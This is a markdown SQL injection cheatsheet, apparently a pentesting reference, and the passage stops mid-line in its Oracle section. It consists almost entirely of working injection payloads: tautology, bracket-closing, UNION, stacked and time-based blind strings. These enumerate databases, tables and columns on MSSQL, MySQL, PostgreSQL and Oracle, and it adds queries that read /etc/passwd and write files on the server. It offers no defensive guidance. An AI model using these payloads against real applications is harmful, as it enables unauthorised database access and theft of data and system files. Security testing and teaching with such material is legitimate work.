# SQL Injection Cheatsheet

## Key Delimiters & Enclosures
- `'`, `"` → String delimiters  
- `` ` `` → MySQL identifier quoting  
- `;` → Statement separator  
- `--`, `/*...*/` → Comments  
## Injection Patterns
- Basic: `' OR 1=1--`  
- Closing Brackets: `')`, `')))--`, `%'))-- -`  
- Logical Operators: `OR`, `AND`  
- Union: `' UNION SELECT ... --`  
- Time-based Blind:
  - MySQL: `'; SELECT SLEEP(5);--`
  - MSSQL: `'; WAITFOR DELAY '00:00:05';--`
  - Oracle: `'; dbms_lock.sleep(5);--`
  - PostgreSQL: `'; SELECT pg_sleep(5);--`
- Out-of-Band: DNS/HTTP queries  
## Testing Methodology
1. Find injection points  
2. Manipulate inputs (delimiters/patterns)  
3. Observe behavior/errors  
4. Automate (SQLMap, OWASP ZAP)  
---
# MSSQL
### List Databases
- Normal: `SELECT name FROM sys.databases;`  
- Union: `' UNION SELECT name, NULL FROM master..sysdatabases --`  
- Stacked: `; SELECT name FROM master..sysdatabases; --`  

### List Tables
- Normal: `SELECT * FROM app.information_schema.tables;`  
- Union: `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --`  
- Stacked: `; SELECT * FROM information_schema.tables; --`  

### List Columns
- Normal: `SELECT COLUMN_NAME, DATA_TYPE FROM app.information_schema.columns WHERE TABLE_NAME='menu';`  
- Union: `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME='table_name' --`  
- Stacked: `; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='table_name'; --`  
---
# MySQL

### List Databases
- Normal: `SHOW DATABASES;`
- Union: `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`
- Stacked: `; SHOW DATABASES; --`   

### List Tables
- Normal: `SHOW TABLES;`
- Union: `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema='db' --`

### List Columns
- Normal: `SHOW COLUMNS FROM table_name;`    
- Union: `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name='table_name' --`

### Read Files
`SELECT LOAD_FILE('/etc/passwd');`

### Write Files
`SELECT * INTO OUTFILE '/tmp/file.txt' FROM table_name;`

---
# PostgreSQL

### List Databases
- Normal: `SELECT datname FROM pg_database;`
- Union: `' UNION SELECT datname, NULL FROM pg_database --`

### List Tables
- Normal: `SELECT table_name FROM information_schema.tables WHERE table_schema='public';`

### List Columns
- Normal: `SELECT column_name FROM information_schema.columns WHERE table_name='table_name';`
### Read Files
`SELECT pg_read_file('/etc/passwd', 0, 1000000);`

### Write Files
`COPY table_name TO '/tmp/file.csv' DELIMITER ',' CSV HEADER;`

---
# Oracle
### List Databases
- Normal: `SELECT name FROM v$database;`
- Union: `' UNION SELECT name, NULL FROM v$database --`
### List Tables
- Normal: `SELECT table_name FROM all_tables;`
### List Columns
- Normal: `SELECT column_name FROM a`